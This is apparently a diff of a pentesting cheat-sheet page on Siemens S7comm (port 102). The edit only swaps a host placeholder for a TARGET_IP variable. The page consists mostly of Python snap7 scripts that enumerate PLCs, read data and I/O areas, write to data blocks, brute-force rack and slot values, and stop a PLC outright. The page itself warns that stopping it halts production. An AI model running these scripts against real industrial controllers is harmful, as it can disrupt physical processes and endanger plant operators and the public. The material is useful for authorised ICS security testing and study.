@@ -1,6 +1,7 @@
 # Port 102 - S7comm (Siemens)
 
 ## Table of Contents
+
 - [Overview](#overview)
 - [Enumeration](#enumeration)
 - [Read/Write Data](#readwrite-data)
@@ -15,6 +16,7 @@
 | 102 | S7comm | Siemens S7 Communication |
 
 S7comm is used by:
+
 - Siemens S7-300 PLCs
 - Siemens S7-400 PLCs
 - Siemens S7-1200 (partial)
@@ -52,8 +54,10 @@ run
 import snap7
 from snap7.util import *
 
+target_host = "TARGET_IP"  # Replace with target
+
 client = snap7.client.Client()
-client.connect('$rhost', 0, 1)  # IP, rack, slot
+client.connect(target_host, 0, 1)  # IP, rack, slot
 
 # Get PLC info
 info = client.get_cpu_info()
@@ -78,8 +82,10 @@ client.disconnect()
 #!/usr/bin/env python3
 import snap7
 
+target_host = "TARGET_IP"  # Replace with target
+
 client = snap7.client.Client()
-client.connect('$rhost', 0, 1)
+client.connect(target_host, 0, 1)
 
 # Read DB1, starting at byte 0, length 100 bytes
 data = client.db_read(1, 0, 100)
@@ -102,8 +108,10 @@ client.disconnect()
 #!/usr/bin/env python3
 import snap7
 
+target_host = "TARGET_IP"  # Replace with target
+
 client = snap7.client.Client()
-client.connect('$rhost', 0, 1)
+client.connect(target_host, 0, 1)
 
 # Read Inputs (I area)
 inputs = client.read_area(snap7.types.Areas.PE, 0, 0, 10)
@@ -126,8 +134,10 @@ client.disconnect()
 #!/usr/bin/env python3
 import snap7
 
+target_host = "TARGET_IP"  # Replace with target
+
 client = snap7.client.Client()
-client.connect('$rhost', 0, 1)
+client.connect(target_host, 0, 1)
 
 # Write to DB1
 data = bytearray([0x00, 0x01, 0x02, 0x03])
@@ -152,8 +162,10 @@ client.disconnect()
 # ⚠️ Extremely dangerous!
 import snap7
 
+target_host = "TARGET_IP"  # Replace with target
+
 client = snap7.client.Client()
-client.connect('$rhost', 0, 1)
+client.connect(target_host, 0, 1)
 
 # STOP PLC - This will stop production!
 client.plc_stop()
@@ -172,8 +184,10 @@ client.disconnect()
 #!/usr/bin/env python3
 import snap7
 
+target_host = "TARGET_IP"  # Replace with target
+
 client = snap7.client.Client()
-client.connect('$rhost', 0, 1)
+client.connect(target_host, 0, 1)
 
 # List blocks
 blocks = client.list_blocks()
@@ -201,11 +215,13 @@ client.disconnect()
 #!/usr/bin/env python3
 import snap7
 
+target_host = "TARGET_IP"  # Replace with target
+
 for rack in range(0, 8):
     for slot in range(0, 32):
         try:
             client = snap7.client.Client()
-            client.connect('$rhost', rack, slot, tcpport=102)
+            client.connect(target_host, rack, slot, tcpport=102)
             info = client.get_cpu_info()
             print(f"[+] Found PLC at rack={rack}, slot={slot}")
             print(f"    Module: {info.ModuleTypeName}")
